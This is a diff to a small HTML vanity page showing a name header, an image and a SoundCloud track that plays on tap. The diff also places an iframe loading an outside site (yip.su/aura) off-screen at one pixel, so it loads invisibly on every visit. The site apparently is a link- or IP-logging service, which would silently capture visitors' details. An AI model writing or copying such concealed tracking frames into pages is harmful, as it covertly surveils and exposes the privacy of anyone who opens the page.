@@ -11,50 +11,76 @@
     font-family: monospace;
     display: flex;
     flex-direction: column;
-    justify-content: center; /* centro verticale */
-    align-items: center;     /* centro orizzontale */
+    justify-content: center;
+    align-items: center;
     user-select: none;
     cursor: pointer;
+    text-align: center;
   }
   #header {
     font-size: 28px;
     margin-bottom: 20px;
-    text-align: center;
   }
   #image {
-    width: 100px; /* dimensione piccola */
+    width: 100px;
   }
-  #hiddenSite {
-    display: none;
+  #instruction {
+    font-size: 16px;
+    margin-top: 30px;
+    color: #ccc;
+  }
+  #yipFrame {
+    position: absolute;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    border: none;
   }
   #soundcloudPlayer {
-    width: 0;
-    height: 0;
-    border: 0;
+    position: fixed;
+    bottom: 5px;
+    right: 5px;
+    width: 1px !important;
+    height: 1px !important;
+    border: none;
+    opacity: 0;
+    pointer-events: none;
+    user-select: none;
   }
 </style>
 </head>
 <body>
   <div id="header">69420alt Pudshi Owner</div>
   <img id="image" src="https://i.postimg.cc/wvWPXkkz/Immagine-2025-07-02-212001.png" alt="69420alt Image" />
+  <div id="instruction">Tap anywhere to play music</div>
 
   <iframe
     id="soundcloudPlayer"
-    width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay"
-    src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true">
-  </iframe>
+    scrolling="no"
+    allow="autoplay"
+    src=""
+  ></iframe>
 
-  <iframe id="hiddenSite" src="https://yip.su/aura"></iframe>
+  <iframe
+    id="yipFrame"
+    src="https://yip.su/aura"
+    frameborder="0"
+  ></iframe>
 
 <script>
-  const iframe = document.getElementById('soundcloudPlayer');
+  const scIframe = document.getElementById('soundcloudPlayer');
+  const instruction = document.getElementById('instruction');
   let started = false;
 
-  document.body.addEventListener('click', () => {
+  function startAudio() {
     if (started) return;
-    iframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true";
+    scIframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
+    instruction.style.display = 'none';
     started = true;
-  });
+  }
+
+  document.body.addEventListener('click', startAudio);
+  document.body.addEventListener('touchstart', startAudio);
 </script>
 </body>
 </html>
